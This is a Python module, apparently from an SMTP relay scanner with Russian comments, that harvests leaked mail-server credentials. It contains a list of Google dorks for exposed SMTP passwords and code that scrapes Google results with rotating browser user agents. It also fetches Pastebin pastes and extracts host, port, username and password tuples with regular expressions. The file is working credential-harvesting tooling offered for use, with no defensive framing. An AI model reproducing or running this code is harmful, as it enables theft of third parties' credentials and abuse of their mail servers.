# smtp_relay_scanner/modules/recon/google_dorks.py

import requests
import re
from typing import List, Dict
from bs4 import BeautifulSoup

# === Dorks для поиска SMTP credentials ===
DORKS = [
    '"smtp" "password" filetype:txt',
    '"SMTP server" "username" "password"',
    '"smtp relay" "port" "username"',
    'intitle:"smtp" "login" "password"',
    '"mail relay" "username" "password"',
    'inurl:smtp "password"',
    '"SMTP" "port 25" "username"',
    '"open SMTP relay" list',
    'site:pastebin.com "smtp" "password"',
    'site:pastebin.com "SMTP" "port" "login"',
    'site:ghostbin.com "smtp"',
    'inurl:"smtp-config" filetype:txt',
    'inurl:"mailer" "smtp" "password"',
    '"smtp_settings" "password" filetype:php',
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

def search_google_dork(dork: str, pages: int = 1) -> List[str]:
    """
    Ищет по Google Dork (парсинг HTML-результатов).
    ВНИМАНИЕ: Google может блокировать парсинг.
    """
    results = []
    for page in range(pages):
        start = page * 10
        url = f"https://www.google.com/search?q={requests.utils.quote(dork)}&start={start}"
        headers = {
            "User-Agent": USER_AGENTS[page % len(USER_AGENTS)],
            "Accept-Language": "en-US,en;q=0.5"
        }
        try:
            resp = requests.get(url, headers=headers, timeout=10)
            if resp.status_code == 200:
                soup = BeautifulSoup(resp.text, 'html.parser')
                for link in soup.find_all('a'):
                    href = link.get('href', '')
                    if 'http' in href and 'google' not in href:
                        # Извлекаем реальный URL из google-редиректа
                        match = re.search(r'/url\?q=(.*?)&', href)
                        if match:
                            real_url = requests.utils.unquote(match.group(1))
                            results.append(real_url)
        except Exception as e:
            print(f"[-] Google search error for dork '{dork[:30]}...': {e}")
    return results

def parse_smtp_credentials(text: str) -> List[Dict[str, str]]:
    """
    Ищет SMTP credentials в тексте (IP:PORT:USER:PASS форматы).
    """
    creds = []
    
    # IP:PORT логин пароль
    patterns = [
        r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{2,5})[:\s]+(\S+)[:\s]+(\S+)',
        r'(smtp\.[a-zA-Z0-9.-]+):(\d{2,5})[:\s]+(\S+)[:\s]+(\S+)',
        r'"server"\s*:\s*"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})".*?"port"\s*:\s*(\d{2,5}).*?"username"\s*:\s*"(\S+)".*?"password"\s*:\s*"(\S+)"',
        r'"host"\s*:\s*"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})".*?"port"\s*:\s*(\d{2,5}).*?"user"\s*:\s*"(\S+)".*?"pass"\s*:\s*"(\S+)"',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE | re.DOTALL)
        for m in matches:
            creds.append({
                'host': m[0],
                'port': m[1],
                'username': m[2],
                'password': m[3]
            })
    
    return creds

def scrape_pastebin(keyword: str = "smtp") -> List[Dict[str, str]]:
    """
    Парсит pastebin результаты.
    """
    creds = []
    try:
        url = f"https://www.google.com/search?q=site:pastebin.com+{keyword}+password"
        headers = {"User-Agent": USER_AGENTS[0]}
        resp = requests.get(url, headers=headers, timeout=10)
        
        if resp.status_code == 200:
            soup = BeautifulSoup(resp.text, 'html.parser')
            for link in soup.find_all('a'):
                href = link.get('href', '')
                if 'pastebin.com' in href and '/url?q=' in href:
                    paste_url = re.search(r'/url\?q=(https://pastebin\.com/\w+)', href)
                    if paste_url:
                        try:
                            paste_resp = requests.get(paste_url.group(1), timeout=10)
                            found = parse_smtp_credentials(paste_resp.text)
                            creds.extend(found)
                        except:
                            pass
    except Exception as e:
        print(f"[-] Pastebin scrape error: {e}")
    
    return creds

def google_dorks_search(dorks: List[str] = None, pages: int = 1) -> List[str]:
    """
    Запускает поиск по всем докам.
    """
    if dorks is None:
        dorks = DORKS
    
    all_urls = []
    for dork in dorks:
        urls = search_google_dork(dork, pages)
        all_urls.extend(urls)
        print(f"[+] Dork '{dork[:40]}...' found {len(urls)} URLs")
    
    return list(set(all_urls))